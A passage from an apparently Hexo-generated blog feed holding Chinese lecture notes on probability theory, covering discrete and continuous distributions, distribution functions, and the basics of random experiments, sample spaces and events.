\stackrel{\text { 记 } \boldsymbol{q}&#x3D;\mathbf{1}-\boldsymbol{p}}{ } C_{n}^{k} p^{k} q^{n-k}<br>$$</p><p>得$X$的分布律为：</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_O5kRKwRCFz.png"></p><p>$$<br>P{X&#x3D;k}&#x3D;C_{n}^{k} p^{k}(1-p)^{n-k} \quad k&#x3D;0,1, \cdots, n<br>$$</p><p>称这样的分布为二项分布，记为$X \sim b(n, p)$。</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_XLu37eAfGO.png"></p><blockquote><p>例题</p></blockquote><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_m5__RbnPTn.png"></p><blockquote><p>分析</p></blockquote><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_x75P4zB2Ul.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_SURtB-u2ws.png"></p><p>图示概率分布</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_mkozyR6VLz.png"></p><h3 id="2-3-4-泊松分布"><a href="#2-3-4-泊松分布" class="headerlink" title="2.3.4 泊松分布"></a>2.3.4 泊松分布</h3><p>设随机变量所有可能的取值为$0, 1, 2, …,$ 而取各个值的概率为：</p><p>$$<br>P{X&#x3D;k}&#x3D;\frac{\lambda^{k}}{k!} \mathrm{e}^{-\lambda}, \quad k&#x3D;0,1,2, \cdots<br>$$</p><p>其中$\lambda&gt;0$是常数，则称 $X$ 服从参数为$\lambda$的泊松分布，记为$X \sim \pi(\lambda)$。</p><p>泊松分布的图形</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_7aJVOraEwO.png"></p><p>$$<br>\sum_{\mathrm{k}&#x3D;0}^{\infty} P(X&#x3D;k)&#x3D;\sum_{\mathrm{k}&#x3D;0}^{\infty} \frac{\lambda^{k} e^{-\lambda}}{k!}&#x3D;e^{-\lambda} \sum_{\mathrm{k}&#x3D;0}^{\infty} \frac{\lambda^{k}}{k!}&#x3D;e^{-\lambda} e^{\lambda}&#x3D;1<br>$$</p><h3 id="2-3-5-二项分布与泊松分布的关系"><a href="#2-3-5-二项分布与泊松分布的关系" class="headerlink" title="2.3.5 二项分布与泊松分布的关系"></a>2.3.5 二项分布与泊松分布的关系</h3><p>历史上，泊松分布是作为二项分布的近似，于1837年由法国数学家泊松引入的 .</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_r490-PQL4O.png"></p><p>Poisson定理说明若$X \sim b(n, p)$, 则当$n$ 较大，$p$ 较小, 而$n p&#x3D;\lambda$适中, 则可以用近似公式：</p><p>$$<br>C_{n}^{k} p^{k}(1-p)^{n-k} \approx e^{-\lambda} \frac{\lambda^{k}}{k!}, \quad k&#x3D;0,1,2, \cdots<br>$$</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_UnBz4vAt2Q.png"></p><hr><h1 id="3-随机变量的分布函数"><a href="#3-随机变量的分布函数" class="headerlink" title="3 随机变量的分布函数"></a>3 随机变量的分布函数</h1><h2 id="3-1-分布函数的定义"><a href="#3-1-分布函数的定义" class="headerlink" title="3.1 分布函数的定义"></a>3.1 分布函数的定义</h2><p>设 X 是一个 随机变量，x为任意实数，函数$F(x)&#x3D;P\{X \leq x\},-\infty&lt;x&lt;\infty$，称为 X 的分布函数。</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_VdcK4meIJ2.png"></p><p>如果将 X 看作数轴上随机点的坐标，那么分布函数 $F(x)$ 的值就表示 X 落在区间$(-∞, x]$内的概率。</p><p>注意：</p><ol><li>在分布函数的定义中,  X是随机变量, x是参变量.</li><li>F(x) 是随机变量 X 取值不大于 x 的概率.</li><li>对任意实数 $x_1 \leq x_2$，随机点落在区间$( x_1 ,  x_2]$内的概率为：</li></ol><p>$$<br>\begin{array}{l}P\{x_{1}&lt;X \leq x_{2}\}&#x3D;P\{X \leq x_{2}\}-P\{X \leq x_{1}\}&#x3D;F(x_{2})-F(x_{1})\end{array}<br>$$</p><h3 id="3-1-1-分布函数的性质"><a href="#3-1-1-分布函数的性质" class="headerlink" title="3.1.1 分布函数的性质"></a>3.1.1 分布函数的性质</h3><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_DttX0d4WCh.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_9gaP5MWsUO.png"></p><p>如果一个函数具有上述性质，则一定是某个随机变量X 的分布函数. 也就是说，性质(1)–(3)是鉴别一个函数是否是某随机变量的分布函数的充分必要条件.</p><hr><h1 id="4-连续型随机变量及其概率密度"><a href="#4-连续型随机变量及其概率密度" class="headerlink" title="4 连续型随机变量及其概率密度"></a>4 连续型随机变量及其概率密度</h1><h2 id="4-1-连续型随机变量及其概率密度的定义"><a href="#4-1-连续型随机变量及其概率密度的定义" class="headerlink" title="4.1 连续型随机变量及其概率密度的定义"></a>4.1 连续型随机变量及其概率密度的定义</h2><p>对于随机变量$ X$ , 如果存在非负可积函数 $f(x)$，$x \in(-\infty,+\infty)$，使得对任意实数$x$，有：</p><p>$$<br>F(x)&#x3D;\int_{-\infty}^{x} f(t) \mathrm{d} t<br>$$</p><p>则称 $X$为连续型随机变量, 称 $f(x)$为 $X$ 的概率密度函数，简称为概率密度。连续型随机变量的分布函数在 $R$ 上连续。</p><h2 id="4-2-概率密度的性质"><a href="#4-2-概率密度的性质" class="headerlink" title="4.2 概率密度的性质"></a>4.2 概率密度的性质</h2><ol><li>$f(x) \geq 0$</li><li>$\int_{-\infty}^{+\infty} f(x) \mathrm{d} x&#x3D;1$<br> 这两条性质是判定一个函数 f(x)是否为某分布的概率密度的充要条件。</li><li>对于任意实数 $x_1 , x_2 , (x_1 &lt; x_2 ) ,P{x_{1}&lt;X \leq x_{2}}&#x3D;\int_{x_{1}}^{x_{2}} f(x) dx$</li></ol><p>利用概率密度可确定随机点落在某个范围内的概率。</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_hCdRKFCCDi.png"></p><ol start="4"><li>若 $f (x)$ 在点 x 处连续 , 则有$F^{\prime}(x)&#x3D;f(x)$。</li></ol><p>对 $f(x)$的进一步理解，若 x 是 $ f(x)$ 的连续点，则：</p><p>$$<br>\begin{aligned} f(x) &amp; &#x3D;\lim _{\Delta x \rightarrow 0^{+}} \frac{F(x+\Delta x)-F(x)}{\Delta x} &#x3D;\lim _{\Delta x \rightarrow 0^{+}} \frac{P{x&lt;X \leq x+\Delta x}}{\Delta x}\end{aligned}<br>$$</p><p>故X的密度 $f(x$) 在 x 这一点的值，恰好是X 落在区间$(x, x+\Delta x]$上的概率与区间长度$\Delta x$之比的极限.  这里，如果把概率理解为质量，$f(x)$相当于线密度。</p><p>若不计高阶无穷小，有$P{x&lt;X \leq x+\Delta x}&#x3D;f(x) \Delta x$，表示随机变量 X 取值于$(x, x+\Delta x]$的概率近似等于$f(x)\Delta x$。</p><h3 id="4-2-1-注意"><a href="#4-2-1-注意" class="headerlink" title="4.2.1 注意"></a>4.2.1 注意</h3><p>连续型随机变量取任一指定实数值 $a$ 的概率均为0. 即$P\{X&#x3D;a\}&#x3D;0$。这是因为连续型随机变量的分布函数 $F(x)$ 是连续的，且</p><p>$$<br>\begin{aligned} 0 \leq P\{X&#x3D;a\} &amp; \leq P\{a-\Delta x&lt;X \leq a\} &#x3D; F(a)-F(a-\Delta x)\end{aligned}<br>$$</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_oqGGf7Y-37.png"></p><p>对连续型随机变量X , 有</p><p>$$<br>P{a \leq X \leq b}&#x3D;P{a&lt;X \leq b}&#x3D;P{a \leq X&lt;b}&#x3D;P{a&lt;X&lt;b}<br>$$</p><h2 id="4-3-常见的连续型随机变量"><a href="#4-3-常见的连续型随机变量" class="headerlink" title="4.3 常见的连续型随机变量"></a>4.3 常见的连续型随机变量</h2><h3 id="4-3-1-均匀分布"><a href="#4-3-1-均匀分布" class="headerlink" title="4.3.1 均匀分布"></a>4.3.1 均匀分布</h3><p>若随机变量$X$的概率密度为：</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_nG-EwZ7Mpx.png"></p><p>则称$X$在区间$(a, b)$上服从均匀分布，记作$X \sim U(a, b)$。</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_OpDUbfUN8C.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_rzzginMTWP.png"></p><h3 id="4-3-2-指数分布"><a href="#4-3-2-指数分布" class="headerlink" title="4.3.2 指数分布"></a>4.3.2 指数分布</h3><p>若随机变量$X$具有概率密度</p><p>$$<br>f(x)&#x3D;\left{\begin{array}{cc}\frac{1}{\theta}e^{-\frac{x}{\theta}},&amp;x&gt;0\0,&amp;\text{其它}\end{array}\right.<br>$$</p><p>其中$\theta&gt;0$为常数，则称$X$ 服从参数为 $\theta$ 的指数分布。指数分布常用于可靠性统计研究中，如元件的寿命。</p><p>若$X$服从参数为 $\theta$ 的指数分布, 则其分布函数为：</p><p>$$<br>F(x)&#x3D;P{X\leq x}&#x3D;\left{\begin{array}{ll}1-e^{-x&#x2F;\theta},&amp;x&gt;0\0,&amp;\text{其它}\end{array}\right.<br>$$</p><blockquote><p>例3  设某类日光灯管的使用寿命 $X$ 服从参数为θ&#x3D;2000的指数分布(单位:小时).<br>(1) 任取一只这种灯管, 求能正常使用1000小时以上的概率. &#x20;<br>(2) 有一只这种灯管已经正常使用了1000 小时以上,求还能使用1000小时以上的概率.&#x20;</p></blockquote><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_VCMMwh21HB.png"></p><p>指数分布的重要性质 :“无记忆性”.</p><h3 id="4-3-3-正态分布"><a href="#4-3-3-正态分布" class="headerlink" title="4.3.3 正态分布"></a>4.3.3 正态分布</h3><p>若连续型随机变量$ X $的概率密度为：</p><p>$$<br>f(x)&#x3D;\frac{1}{\sqrt{2 \pi} \sigma} \mathrm{e}^{-\frac{(x-\mu)^{2}}{2 \sigma^{2}}},-\infty&lt;x&lt;\infty<br>$$</p><p>其中$\mu$和$\sigma$($\sigma$&gt;0)都是常数, 则称$X$服从参数为$(\mu, \sigma)$的正态分布或高斯分布，记作$X \sim N\left(\mu, \sigma^{2}\right)$。</p><h4 id="4-3-3-1-f-x-具有下述性质"><a href="#4-3-3-1-f-x-具有下述性质" class="headerlink" title="4.3.3.1 f(x)具有下述性质"></a>4.3.3.1 f(x)具有下述性质</h4><ol><li>$f(x) \geq 0$</li><li>$\int_{-\infty}^{\infty} f(x) d x&#x3D;1$</li><li>函数$f(x)$在$(-∞, \mu]$上单调增加，在$[\mu, ∞)$上单调减少，在$x&#x3D;\mu$取得最大值</li></ol><p>$$f(\mu)&#x3D;\frac1{\sqrt{2\pi}\sigma}$$</p><p>函数图像如下：</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_VwIlgYMkbg.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_WcyCS5bR0n.png"></p><p>正态分布$N\left(\mu, \sigma^{2}\right)$的图形特点：</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_MGAXmKLKyB.png"></p><p>$\mu$决定了图形的中心位置，$\sigma$决定了图形中峰的陡峭程度。</p><h4 id="4-3-3-2-分布函数"><a href="#4-3-3-2-分布函数" class="headerlink" title="4.3.3.2 分布函数"></a>4.3.3.2 分布函数</h4><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_kxnqdTil5T.png"></p><p>$\mu&#x3D;0，\sigma&#x3D;1$的正态分布称为标准正态分布，其密度函数和分布函数常用$\phi(x)$和$\Phi(x)$表示：</p><p>$$<br>\phi(x)&#x3D;\frac{1}{\sqrt{2 \pi}} \mathrm{e}^{-\frac{x^{2}}{2}}, \quad-\infty&lt;x&lt;\infty<br>$$</p><p>$$<br>\Phi(x)&#x3D;\frac{1}{\sqrt{2 \pi}} \int_{-\infty}^{x} \mathrm{e}^{-\frac{t^{2}}{2}} \mathrm{~d} t,-\infty&lt;x&lt;\infty<br>$$</p><p>$定理1：若 X \sim N\left(\mu, \sigma^{2}\right), 则 Z&#x3D;\frac{X-\mu}{\sigma} \sim N(0,1)$</p><blockquote><p>标准正态分布的重要性在于，任何一个一般的正态分布都可以通过线性变换转化为标准正态分布。</p></blockquote><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_cMl4siCs2Q.png"></p><p>分布函数的性质：</p><p>（1）$\Phi(0)&#x3D;\frac{1}{2}$</p><p>（2）$\forall x \in R, \Phi(-x)&#x3D;1-\Phi(x)$</p><p>（3）“$3\sigma$”准则：由标准正态分布的查表计算可以求得，当X～N(0,1)时：</p><p>$$<br>\begin{array}{l}P{|X| \leq 1}&#x3D;2 \Phi(1)-1&#x3D;0.6826 \ P{|X| \leq 2}&#x3D;2 \Phi(2)-1&#x3D;0.9544 \ P{|X| \leq 3}&#x3D;2 \Phi(3)-1&#x3D;0.9974\end{array}<br>$$</p><p>这说明，X的取值几乎全部集中在$[-3,3]$区间内，超出这个范围的可能性仅占不到0.3%。</p><p>将上述结论推广到一般的正态分布,  $\boldsymbol{X} \sim N\left(\mu, \sigma^{2}\right) 时, \quad \boldsymbol{Y}&#x3D;\frac{\boldsymbol{X}-\mu}{\sigma} \sim N(0,1)$，有以下规律：</p><p>$$<br>\begin{array}{l}P(\mu-\sigma \leq X \leq \mu+\sigma)&#x3D;0.6826 \ P(\mu-2 \sigma \leq X \leq \mu+2 \sigma)&#x3D;0.9544 \ P(\mu-3 \sigma \leq X \leq \mu+3 \sigma)&#x3D;0.9974\end{array}<br>$$</p><p>可以认为，$X$的取值几乎全部集中在$[\mu-3\sigma, \mu+3\sigma]$区间内，这在统计学上称为“$3\sigma$准则”。</p><p>（4）标准正态分布的上$α$分位点：$设{X} \sim N(0,1)$，若数$z_a$满足条件</p><p>$$<br>    {P}\{X&gt;z_{\alpha}\}&#x3D;\alpha, 0&lt;\alpha&lt;1 \Longrightarrow P\{X&lt;-z_{\alpha}\}&#x3D;\alpha<br>$$</p><p>则称点 $z_{\alpha}$ 为标准正态分布的上$ {\alpha}$ 分位点.</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_56SUt4cpVL.png"></p><blockquote><p>例5  公共汽车车门的高度是按男子与车门顶头碰头机会在 0.01 以下来设计的.设男子身高X～N(170,6²),问车门高度应如何确定?&#x20;</p></blockquote><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_kC2qmGa0PG.png"></p><hr><h1 id="5-随机变量的函数的分布"><a href="#5-随机变量的函数的分布" class="headerlink" title="5 随机变量的函数的分布"></a>5 随机变量的函数的分布</h1><h2 id="5-1-离散型随机变量函数的分布"><a href="#5-1-离散型随机变量函数的分布" class="headerlink" title="5.1 离散型随机变量函数的分布"></a>5.1 离散型随机变量函数的分布</h2><p>一般地，若X是离散型随机变量 ，X 的分布律为$X \sim\left(\begin{array}{llll}x_{1} &amp; x_{2} &amp; \cdots &amp; x_{n} \ p_{1} &amp; p_{2} &amp; \cdots &amp; p_{n}\end{array}\right)$，则$Y&#x3D;g(X) \sim\left(\begin{array}{cccc}g\left(x_{1}\right) &amp; g\left(x_{2}\right) &amp; \cdots &amp; g\left(x_{n}\right) \ p_{1} &amp; p_{2} &amp; \cdots &amp; p_{n}\end{array}\right)$，之后合并相同项。</p><h2 id="5-2-连续型随机变量函数的分布"><a href="#5-2-连续型随机变量函数的分布" class="headerlink" title="5.2 连续型随机变量函数的分布"></a>5.2 连续型随机变量函数的分布</h2><blockquote><p>$例3 设 X 具有概率密度 f_{X}(x), 求 Y&#x3D;X^{2} 的概率密度.$</p></blockquote><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_wOKwkMjDVF.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_j2v7W7M_N0.png"></p><p>从上述例子中可以看到，在求P(Y≤y) 的过程中，关键的一步是设法从{ g(X) ≤ y }中解出X,  从而得到与 {g(X) ≤ y }等价的X 的不等式。这是求随机变量的函数的分布的一种常用方法.（称为<strong>分布函数法</strong>）</p><p>下面给出一个定理，在满足定理条件时可直接用它求出随机变量函数的概率密度 . &#x20;</p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_v8UTG3C2m5.png"></p><hr><h1 id="6-总结"><a href="#6-总结" class="headerlink" title="6 总结"></a>6 总结</h1><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_b618zXzFB7.png"></p><p><img src="/2024/06/11/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC2%E7%AB%A0%EF%BC%9A%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E5%8F%8A%E5%85%B6%E5%88%86%E5%B8%83/image_fulZcZkqvK.png"></p>]]></content>
      
      
      <categories>
          
          <category> 专业课 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概率论 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论第1章：概率论的基本概念</title>
      <link href="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/"/>
      <url>/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/</url>
      
        <content type="html"><![CDATA[<h1 id="1-随机试验"><a href="#1-随机试验" class="headerlink" title="1 随机试验"></a>1 随机试验</h1><p>概率论是研究随机现象规律性的一门数学学科。</p><h2 id="1-1-随机现象"><a href="#1-1-随机现象" class="headerlink" title="1.1 随机现象"></a>1.1 随机现象</h2><p>随机现象的特征：条件不能完全决定结果。</p><h3 id="1-1-1-确定性现象"><a href="#1-1-1-确定性现象" class="headerlink" title="1.1.1 确定性现象"></a>1.1.1 确定性现象</h3><p>在一定条件下必然发生的现象称为确定性现象。</p><h3 id="1-1-2-随机现象"><a href="#1-1-2-随机现象" class="headerlink" title="1.1.2 随机现象"></a>1.1.2 随机现象</h3><p>在一定条件下可能出现也可能不出现的现象称为随机现象。</p><blockquote><p>实例1：在相同条件下掷一枚均匀的硬币，观察正反两面出现的情况。</p></blockquote><p>说明：</p><ol><li>随机现象揭示了条件和结果之间的非确定性联系 , 其数量关系无法用函数加以描述</li><li>随机现象在一次观察中出现什么结果具有偶然性, 但在大量试验或观察中, 这种结果的出现具有一定的统计规律性</li></ol><p>随机现象是通过随机试验来研究的。</p><h2 id="1-2-随机试验"><a href="#1-2-随机试验" class="headerlink" title="1.2 随机试验"></a>1.2 随机试验</h2><p>在概率论中，把具有以下三个特征的试验称为<strong>随机试验</strong>。</p><ol><li>可以在相同的条件下重复地进行</li><li>每次试验的可能结果不止一个, 并且能事先明确试验的所有可能结果</li><li>进行一次试验之前不能确定哪一个结果会出现</li></ol><p>说明：</p><ol><li>随机试验简称为试验, 是一个广泛的术语。它包括各种各样的科学实验, 也包括对客观事物进行的 “调查”、“观察”或 “测量” 等</li><li>随机试验通常用 E 来表示</li></ol><hr><h1 id="2-样本空间、随机事件"><a href="#2-样本空间、随机事件" class="headerlink" title="2 样本空间、随机事件"></a>2 样本空间、随机事件</h1><h2 id="2-1-样本空间、样本点"><a href="#2-1-样本空间、样本点" class="headerlink" title="2.1 样本空间、样本点"></a>2.1 样本空间、样本点</h2><p>一个随机试验E的所有可能结果所组成的集合称为随机试验E的样本空间，记为S。样本空间中的元素，即E的每个结果，称为样本点。</p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_aISwGRDyUl.png"></p><blockquote><p>实例1  将一枚硬币抛掷两次, 观察正面H、反面T出现的情况。</p></blockquote><p>则样本空间：$S&#x3D;{(H,H), (H,T), (T,H), (T,T)}$</p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_vc1TAff_Pd.png"></p><ol><li>试验不同, 对应的样本空间也不同.</li><li>同一试验, 若试验目的不同, 则对应的样本空间也不同.</li><li>建立样本空间, 事实上就是建立随机现象的数学模型。因此 , 一个样本空间可以概括许多内容大不相同的实际问题.</li></ol><h2 id="2-2-随机事件的概念"><a href="#2-2-随机事件的概念" class="headerlink" title="2.2 随机事件的概念"></a>2.2 随机事件的概念</h2><p>随机试验 E 的样本空间 S 的子集称为 E 的随机事件, 简称事件。通常以大写英文字母 A, B, C, 来表示事件。</p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_tSCof_8Dg4.png"></p><ol><li>当且仅当集合A中的一个样本点出现时, 称随机事件A发生.</li><li>随机试验、样本空间与随机事件的关系：每一个随机试验相应地有一个样本空间, 样本空间的子集就是随机事件。</li></ol><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_UeEt0r2f6y.png"></p><h2 id="2-3-事件间的关系与事件的运算"><a href="#2-3-事件间的关系与事件的运算" class="headerlink" title="2.3 事件间的关系与事件的运算"></a>2.3 事件间的关系与事件的运算</h2><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_4xlIulgA8s.png"></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image__hQW0tCgKU.png"></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_4RfHeJRtP2.png"></p><p><img src="/2024/06/10/%E6%A6%82%E7%8E%87%E8%AE%BA%E7%AC%AC1%E7%AB%A0%EF%BC%9A%E6%A6%82%E7%8E%87%E8%AE%BA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5/image_ODbdPEwtoM.png"></p><h3 id="2-3-1-随机事件的运算规律-xD"><a href="#2-3-1-随机事件的运算规律-xD" class="headerlink" title="2.3.1 随机事件的运算规律&#xD;"></a>2.3.1 随机事件的运算规律&#xD;</h3><ol><li><strong>幂等律：</strong>$A \cup A&#x3D;A, \quad A \cap A&#x3D;A$</li><li><strong>交换律：</strong>$A \cup B&#x3D;B \cup A, \quad A \cap B&#x3D;B \cap A$</li><li><strong>结合律：</strong></li></ol><p>$$<br>\begin{array}{l}(A \cup B) \cup C&#x3D;A \cup(B \cup C) \ (A \cap B) \cap C&#x3D;A \cap(B \cap C)\end{array}<br>$$</p><ol 